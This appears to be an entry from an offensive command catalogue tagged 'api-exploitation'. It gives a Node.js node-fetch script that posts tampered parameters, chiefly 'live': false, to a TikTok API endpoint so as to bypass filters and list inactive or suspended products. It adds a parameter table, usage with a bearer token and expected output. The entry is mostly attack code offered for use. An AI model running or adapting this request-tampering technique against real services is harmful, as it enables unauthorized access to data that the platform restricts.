---
data: >-
  const fetch =require('node-fetch'); const url
  ='https://*.tiktok.com/api/v1/xyz'; const postData
  ={campaign_id:"0",product_name:"",page_index:1,page_size:30,live:false}; const
  headers ={// headers}; fetch(url,{method:'POST',headers:
  headers,body:JSON.stringify(postData)}).then(response=>{if(!response.ok){throw
  new Error('error');}return response.json();}).then(data=>{
  console.log(data);}).catch(error=>{ console.error('fetch error:', error);});
tags:
  - api-exploitation
type: command
executor: javascript
platforms:
  - Web
id: e9643e7a-8df3-46f1-83fe-6a9a1ae7b346
created_at: '2025-12-14T17:28:36.436Z'
updated_at: '2025-12-14T17:28:36.436Z'
verified: false
validated: true
submitted: true
---
# node-fetch-post-to-tiktok-api-live-false

## Command

```javascript
const fetch =require('node-fetch'); const url ='https://*.tiktok.com/api/v1/xyz'; const postData ={campaign_id:"0",product_name:"",page_index:1,page_size:30,live:false}; const headers ={// headers}; fetch(url,{method:'POST',headers: headers,body:JSON.stringify(postData)}).then(response=>{if(!response.ok){throw new Error('error');}return response.json();}).then(data=>{ console.log(data);}).catch(error=>{ console.error('fetch error:', error);});
```

## Description

Node.js script using node-fetch to POST tampered data to TikTok API, setting 'live': false to access inactive products.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | API endpoint (https://*.tiktok.com/api/v1/xyz) | Yes |
| campaign_id | Arbitrary campaign ID ("0") | Yes |
| product_name | Search term ("") | Yes |
| page_index | Pagination start (1) | Yes |
| page_size | Items per page (30) | Yes |
| live | Boolean to bypass filters (false) | Yes |
| headers | Authentication/custom headers | Yes |

## Examples

### Basic Usage

```javascript
// As above
```
Run with `node script.js`.

### Advanced Usage

Add specific headers: headers = {'Authorization': 'Bearer token', 'Content-Type': 'application/json'};

## Expected Output

JSON: {code: 0, data: [{product details including suspended ones}], message: 'success'}

## Related

- [[procedures/Send-POST-Request-with-Live-False-Using-Node-Fetch]]
